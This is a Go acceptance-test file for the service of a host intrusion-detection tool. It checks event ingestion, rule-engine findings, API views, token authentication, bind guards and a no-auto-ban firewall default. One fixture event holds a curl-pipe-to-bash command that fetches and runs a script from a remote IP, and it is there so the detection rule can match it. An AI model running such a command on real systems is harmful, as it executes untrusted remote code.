package service

// service_test.go —— 常驻链路的验收测试。
//
// 这里刻意不用 mock 打桩存储/检测/API：要验的就是「真 store + 真规则引擎 +
// 真 handler」这条路走通，把中间任何一层换成假实现，测过的就不是产品。
// 只有**采集器**是假的——真采集器要 root、要跑 lsof/ps，测试必须能在
// CI 与任意笔记本上稳定跑。

import (
	"context"
	"encoding/json"
	"errors"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/Kur1sulab/atfield/go/internal/collector"
	"github.com/Kur1sulab/atfield/go/internal/model"
)

// fakeCollector 可控采集器：按需产出事件，并实现 Snapshot 让状态链路可测。
type fakeCollector struct {
	name     string
	mode     string
	interval time.Duration
	probeErr error
	snapshot map[string]any

	mu     sync.Mutex
	events []model.Event
	runs   int
	closed bool
	// blockUntil 非 nil 时 Collect 会阻塞到它关闭（模拟慢采集器，测退出用）。
	blockUntil chan struct{}
}

func (f *fakeCollector) Name() string            { return f.name }
func (f *fakeCollector) Mode() string            { return f.mode }
func (f *fakeCollector) Interval() time.Duration { return f.interval }
func (f *fakeCollector) Probe() error            { return f.probeErr }

func (f *fakeCollector) Collect(ctx context.Context) ([]model.Event, error) {
	if f.blockUntil != nil {
		select {
		case <-f.blockUntil:
		case <-ctx.Done():
			return nil, ctx.Err()
		}
	}
	f.mu.Lock()
	defer f.mu.Unlock()
	f.runs++
	out := make([]model.Event, len(f.events))
	copy(out, f.events)
	return out, nil
}

func (f *fakeCollector) Close() error {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.closed = true
	return nil
}

func (f *fakeCollector) Snapshot() map[string]any { return f.snapshot }

func (f *fakeCollector) Runs() int {
	f.mu.Lock()
	defer f.mu.Unlock()
	return f.runs
}

func (f *fakeCollector) Closed() bool {
	f.mu.Lock()
	defer f.mu.Unlock()
	return f.closed
}

// processEvents 一批能同时喂饱「事件」与「规则」的样本：
//  1. 一条 process.start 命中 AEG-001（curl 管道执行）→ 必须产生告警
//  2. 一条 process.suspicious → 只入库，不指望命中规则
func processEvents() []model.Event {
	pipe := model.NewEvent("process.start", "process")
	pipe.Process = "sh"
	pipe.Path = "/bin/sh"
	pipe.Cmdline = "curl http://198.51.100.7/x.sh | bash"
	pipe.Severity = "medium"

	susp := model.NewEvent("process.suspicious", "process")
	susp.Process = "payload"
	susp.Path = "/tmp/payload"
	susp.Cmdline = "/tmp/payload --daemon"
	susp.Severity = "high"
	return []model.Event{*pipe, *susp}
}

// newTestService 起一个只含假采集器的服务（临时数据目录，绝不碰 ~/.atfield）。
func newTestService(t *testing.T, tune func(*Options)) *Service {
	t.Helper()
	col := &fakeCollector{
		name: "process", mode: collector.ModePoll, interval: time.Hour,
		events:   processEvents(),
		snapshot: map[string]any{"count": 137, "suspicious": 2, "users": 3, "ts": 1700000000.0},
	}
	return newServiceWith(t, []collector.Collector{col}, tune)
}

// newServiceWith 指定采集器集合起服务。
func newServiceWith(t *testing.T, cols []collector.Collector, tune func(*Options)) *Service {
	t.Helper()
	opts := Options{
		Addr:       "127.0.0.1:0",
		DataDir:    t.TempDir(),
		Version:    "test-serve",
		Collectors: cols,
	}
	if tune != nil {
		tune(&opts)
	}
	svc, err := New(opts)
	if err != nil {
		t.Fatalf("service.New: %v", err)
	}
	t.Cleanup(func() { _ = svc.Close() })
	return svc
}

// getJSON 打 handler 并解析 JSON。
func getJSON(t *testing.T, url string, header map[string]string) (int, map[string]any) {
	t.Helper()
	req, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		t.Fatalf("构造请求: %v", err)
	}
	for k, v := range header {
		req.Header.Set(k, v)
	}
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatalf("GET %s: %v", url, err)
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	var out map[string]any
	if err := json.Unmarshal(body, &out); err != nil {
		t.Fatalf("GET %s 返回的不是 JSON（%d）：%s", url, resp.StatusCode, truncate(string(body), 200))
	}
	return resp.StatusCode, out
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "…"
}

// TestPipelineFeedsOverviewAndViews 是本任务的核心验收：
// 一轮采集之后，/api/overview 与 /api/views 必须是**真数据**。
func TestPipelineFeedsOverviewAndViews(t *testing.T) {
	svc := newTestService(t, nil)
	ctx := context.Background()
	svc.Round(ctx)

	ts := httptest.NewServer(svc.Handler())
	defer ts.Close()

	code, ov := getJSON(t, ts.URL+"/api/overview", nil)
	if code != http.StatusOK {
		t.Fatalf("/api/overview 状态码 = %d，期望 200", code)
	}
	// 事件确实入库
	totals := ov["totals"].(map[string]any)
	if got := int(totals["events"].(float64)); got != 2 {
		t.Errorf("totals.events = %d，期望 2（两条假事件都要入库）", got)
	}
	// 采集器的快照确实发布到 state（overview 的 processes 来自它）
	if got := int(totals["processes"].(float64)); got != 137 {
		t.Errorf("totals.processes = %d，期望 137（来自 fake Snapshot）", got)
	}
	if got := int(totals["persistence_suspicious"].(float64)); got != 0 {
		t.Errorf("totals.persistence_suspicious = %d，期望 0（没有 persistence 采集器）", got)
	}
	// 采集器运行统计确实回写（否则面板上采集器整块是空的）
	rows, _ := ov["collectors"].([]any)
	if len(rows) != 1 {
		t.Fatalf("collectors 行数 = %d，期望 1", len(rows))
	}
	row := rows[0].(map[string]any)
	if row["name"] != "process" || int(row["runs"].(float64)) != 1 {
		t.Errorf("collectors[0] = %v，期望 name=process runs=1", row)
	}
	// 健康度/威胁/判决三块必须是结构化的真对象，不是 null
	for _, k := range []string{"health", "threat", "verdict", "governance"} {
		if ov[k] == nil {
			t.Errorf("overview.%s 为 null", k)
		}
	}

	// ---- /api/views：视图层聚合一 ----
	code, vw := getJSON(t, ts.URL+"/api/views", nil)
	if code != http.StatusOK {
		t.Fatalf("/api/views 状态码 = %d，期望 200", code)
	}
	findings, _ := vw["findings"].([]any)
	if len(findings) == 0 {
		t.Fatalf("/api/views.findings 为空：规则引擎没有再链路上生效（views=%v）", vw["counts"])
	}
	f0 := findings[0].(map[string]any)
	// 视图层映射的关键字段：fid 而不是 id，且有中文严重度与内嵌事件
	for _, k := range []string{"fid", "rule_id", "name", "severity", "severity_cn", "detail", "event"} {
		if _, ok := f0[k]; !ok {
			t.Errorf("finding 视图缺字段 %q: %v", k, f0)
		}
	}
	if f0["rule_id"] != "AEG-001" {
		t.Errorf("命中的规则 = %v，期望 AEG-001（curl 管道执行）", f0["rule_id"])
	}
	evs, _ := vw["events"].([]any)
	if len(evs) == 0 {
		t.Fatalf("/api/views.events 为空")
	}
	ev0 := evs[0].(map[string]any)
	for _, k := range []string{"kind", "source", "ts", "time", "severity_cn", "text"} {
		if _, ok := ev0[k]; !ok {
			t.Errorf("event 视图缺字段 %q: %v", k, ev0)
		}
	}
	counts := vw["counts"].(map[string]any)
	if int(counts["findings"].(float64)) != len(findings) {
		t.Errorf("counts.findings = %v 与实际条数 %d 不一致", counts["findings"], len(findings))
	}
}

// TestServeEndToEnd 真起监听（:0）、curl 三个入口、再优雅退出。
func TestServeEndToEnd(t *testing.T) {
	col := &fakeCollector{
		name: "process", mode: collector.ModePoll, interval: 50 * time.Millisecond,
		events:   processEvents(),
		snapshot: map[string]any{"count": 42, "suspicious": 1, "users": 2, "ts": 1700000000.0},
	}
	// Addr 用 :0：端口交给内核挑，测试不猜端口（先 Listen 再 Close 的
	// 「挑空闲端口」写法有被别的进程抢走的窗口，CI 上偶发一次能查到天亮）。
	svc, err := New(Options{Addr: "127.0.0.1:0", DataDir: t.TempDir(), Version: "e2e", Collectors: []collector.Collector{col}})
	if err != nil {
		t.Fatalf("service.New: %v", err)
	}
	ctx, cancel := context.WithCancel(context.Background())
	// 无论断言怎么失败都要 cancel：不然 Run 协程还在写数据目录，
	// t.TempDir 的清理会报 "directory not empty"，掩盖真正的失败原因。
	defer cancel()
	done := make(chan error, 1)
	go func() { done <- svc.Run(ctx) }()

	// 等服务真正开始监听：Addr() 从 ":0" 变成真实端口。
	var addr string
	deadline := time.Now().Add(5 * time.Second)
	for time.Now().Before(deadline) {
		if a := svc.Addr(); !strings.HasSuffix(a, ":0") {
			addr = a
			break
		}
		time.Sleep(10 * time.Millisecond)
	}
	if addr == "" {
		t.Fatal("服务未在 5s 内开始监听")
	}

	// 首轮采集是异步的：等到 overview 里「事件已入库」且「采集器快照已发布」
	// 再断言。两个条件必须一起等——采集轮次里是 ingest → publishState 两步，
	// 只等 events 会撞上中间那一瞬（事件有了、processes 还是 0）。
	var ov map[string]any
	deadline = time.Now().Add(5 * time.Second)
	for {
		code, got := getJSONSoft("http://" + addr + "/api/overview")
		if code == http.StatusOK {
			if t, ok := got["totals"].(map[string]any); ok {
				if int(asFloatAny(t["events"])) > 0 && int(asFloatAny(t["processes"])) == 42 {
					ov = got
					break
				}
			}
		}
		if time.Now().After(deadline) {
			t.Fatalf("/api/overview 5s 内没有就绪（最后 code=%d）：%v", code, got["totals"])
		}
		time.Sleep(30 * time.Millisecond)
	}
	totals := ov["totals"].(map[string]any)
	if int(totals["processes"].(float64)) != 42 {
		t.Errorf("totals.processes = %v，期望 42（采集器快照没发布到 state）", totals["processes"])
	}

	// 静态首页（embed 前端）与未知 API 的兜底行为
	resp, err := http.Get("http://" + addr + "/")
	if err != nil {
		t.Fatalf("GET /: %v", err)
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK || !strings.Contains(strings.ToLower(string(body)), "<html") {
		t.Errorf("GET / = %d len=%d，期望 200 且是 HTML", resp.StatusCode, len(body))
	}
	code, errBody := getJSON(t, "http://"+addr+"/api/nope", nil)
	if code != http.StatusNotFound || errBody["error"] != "unknown api" {
		t.Errorf("GET /api/nope = %d %v，期望 404 unknown api", code, errBody)
	}

	// 采集循环在持续跑：服务对周期做了 1s 下限（防止配置写错时打成死循环），
	// 所以这里必须等过一个完整周期才能看到第 2 轮。
	time.Sleep(1300 * time.Millisecond)
	if col.Runs() < 2 {
		t.Errorf("采集器只跑了 %d 轮，周期循环没起来", col.Runs())
	}

	// 优雅退出：Run 必须返回 nil，且退出前落盘
	cancel()
	select {
	case err := <-done:
		if err != nil {
			t.Fatalf("Run 返回错误: %v", err)
		}
	case <-time.After(10 * time.Second):
		t.Fatal("Run 未在 10s 内退出（优雅退出失效）")
	}
	if !col.Closed() {
		t.Error("采集器未被 Close")
	}
	// 落盘验证：events.jsonl 有内容（store.Close 才 flush，这里必须已经写完）
	path := filepath.Join(svc.opts.DataDir, "events.jsonl")
	if n := fileSize(t, path); n == 0 {
		t.Errorf("%s 为空，事件没有落盘", path)
	}
	// 退出后再写必须报错（证明 store 真的关了，而不是只停了 HTTP）
	if err := svc.Store().AddEvents(processEvents()); err == nil {
		t.Error("服务退出后 store 仍接受写入，Close 没有生效")
	}
}

// asFloatAny 把 JSON 解出来的数字转 float64（缺失按 0）。
func asFloatAny(v any) float64 {
	switch x := v.(type) {
	case float64:
		return x
	case int:
		return float64(x)
	}
	return 0
}

// getJSONSoft 同 getJSON，但连接失败/非 JSON 不 fatal（轮询等待时用）。
func getJSONSoft(url string) (int, map[string]any) {
	client := http.Client{Timeout: 2 * time.Second}
	resp, err := client.Get(url)
	if err != nil {
		return 0, map[string]any{}
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	var out map[string]any
	if err := json.Unmarshal(body, &out); err != nil {
		return resp.StatusCode, map[string]any{}
	}
	return resp.StatusCode, out
}

func fileSize(t *testing.T, path string) int64 {
	t.Helper()
	fi, err := os.Stat(path)
	if err != nil {
		t.Fatalf("stat %s: %v", path, err)
	}
	return fi.Size()
}

// TestCollectorRowsCarryAvailability 不可用的采集器必须在 overview 里
// 带着原因出现，而不是「一行都没有」或「runs=0 看起来像没跑」。
func TestCollectorRowsCarryAvailability(t *testing.T) {
	ok := &fakeCollector{
		name: "process", mode: collector.ModePoll, interval: time.Hour,
		events:   processEvents(),
		snapshot: map[string]any{"count": 5},
	}
	bad := &fakeCollector{
		name: "privileged", mode: collector.ModeStream, interval: time.Second,
		probeErr: errors.New("需要 root（eslogger 起不来）"),
	}
	svc := newServiceWith(t, []collector.Collector{ok, bad}, nil)
	svc.Round(context.Background())
	ts := httptest.NewServer(svc.Handler())
	defer ts.Close()

	_, ov := getJSON(t, ts.URL+"/api/overview", nil)
	rows, _ := ov["collectors"].([]any)
	if len(rows) != 2 {
		t.Fatalf("collectors 行数 = %d，期望 2（可用的与不可用的都要列）", len(rows))
	}
	byName := map[string]map[string]any{}
	for _, r := range rows {
		m := r.(map[string]any)
		byName[m["name"].(string)] = m
	}
	proc := byName["process"]
	if proc["mode"] != "poll" || proc["interval"] != "1h0m0s" || proc["available"] != true || proc["probed"] != true {
		t.Errorf("process 行 = %v，期望 mode=poll interval=1h0m0s available=true probed=true", proc)
	}
	priv := byName["privileged"]
	if priv["mode"] != "stream" || priv["available"] != false || priv["probed"] != true {
		t.Errorf("privileged 行 = %v，期望 mode=stream available=false probed=true", priv)
	}
	if s, _ := priv["reason"].(string); !strings.Contains(s, "root") {
		t.Errorf("privileged.reason = %q，期望带不可用原因", s)
	}
	if int(priv["runs"].(float64)) != 0 {
		t.Errorf("privileged.runs = %v，期望 0（不可用不采集）", priv["runs"])
	}
}

// TestTokenAuthMatchesPythonShape 未带令牌时必须是 Python 同形的 401。
func TestTokenAuthMatchesPythonShape(t *testing.T) {
	svc := newTestService(t, func(o *Options) { o.Token = "s3cret-token" })
	svc.Round(context.Background())
	ts := httptest.NewServer(svc.Handler())
	defer ts.Close()

	code, body := getJSON(t, ts.URL+"/api/overview", nil)
	if code != http.StatusUnauthorized {
		t.Fatalf("匿名访问 /api/overview = %d，期望 401", code)
	}
	if body["error"] != "未登录" || body["login_required"] != true {
		t.Errorf("401 响应体 = %v，期望 {error:未登录, login_required:true}", body)
	}
	code, _ = getJSON(t, ts.URL+"/api/overview", map[string]string{"Authorization": "Bearer s3cret-token"})
	if code != http.StatusOK {
		t.Errorf("带令牌访问 = %d，期望 200", code)
	}
	// 未知 API：未登录先 401，登录后才 404（Python 同序：先 guard 再 _static）
	code, _ = getJSON(t, ts.URL+"/api/nope", nil)
	if code != http.StatusUnauthorized {
		t.Errorf("匿名访问未知 API = %d，期望 401（不能靠 404/401 摸接口面）", code)
	}
	code, body = getJSON(t, ts.URL+"/api/nope", map[string]string{"Authorization": "Bearer s3cret-token"})
	if code != http.StatusNotFound || body["error"] != "unknown api" {
		t.Errorf("带令牌访问未知 API = %d %v，期望 404 unknown api", code, body)
	}
	// 静态资源不受令牌限制（登录页本身必须能打开，Python 同）
	resp, err := http.Get(ts.URL + "/")
	if err != nil {
		t.Fatalf("GET /: %v", err)
	}
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		t.Errorf("匿名 GET / = %d，期望 200", resp.StatusCode)
	}
}

// TestBindGuard 非回环监听必须显式解锁，且必须带令牌。
func TestBindGuard(t *testing.T) {
	cases := []struct {
		name    string
		opts    Options
		wantErr bool
	}{
		{"回环默认", Options{Addr: "127.0.0.1:8866"}, false},
		{"localhost", Options{Addr: "localhost:8866"}, false},
		{"IPv6 回环", Options{Addr: "[::1]:8866"}, false},
		{"全网卡无令牌", Options{Addr: "0.0.0.0:8866"}, true},
		{"全网卡+allow-remote 无令牌", Options{Addr: "0.0.0.0:8866", AllowRemote: true}, true},
		{"全网卡+allow-remote+令牌", Options{Addr: "0.0.0.0:8866", AllowRemote: true, Token: "t0ken"}, false},
		{"格式错误", Options{Addr: "no-port"}, true},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if err := checkBind(c.opts); (err != nil) != c.wantErr {
				t.Fatalf("checkBind(%q) err=%v，期望 wantErr=%v", c.opts.Addr, err, c.wantErr)
			}
		})
	}
}

// TestNoAutoBan 服务跑完整条链路后，封禁表必须还是空的。
func TestNoAutoBan(t *testing.T) {
	svc := newTestService(t, nil)
	svc.Round(context.Background())
	ts := httptest.NewServer(svc.Handler())
	defer ts.Close()

	code, st := getJSON(t, ts.URL+"/api/firewall", nil)
	if code != http.StatusOK {
		t.Fatalf("/api/firewall = %d，期望 200", code)
	}
	if n := int(st["count"].(float64)); n != 0 {
		t.Errorf("封禁表有 %d 条：服务不该自动封禁任何东西", n)
	}
	// 能力枚举必须存在（人要知道这台机器上能封什么、是不是 dry-run）
	if _, ok := st["caps"]; !ok {
		t.Error("/api/firewall 缺 caps：无法枚举可封禁能力")
	}
	if dry, ok := st["dry_run"].(bool); !ok || !dry {
		t.Errorf("dry_run = %v，默认必须是 true", st["dry_run"])
	}
}
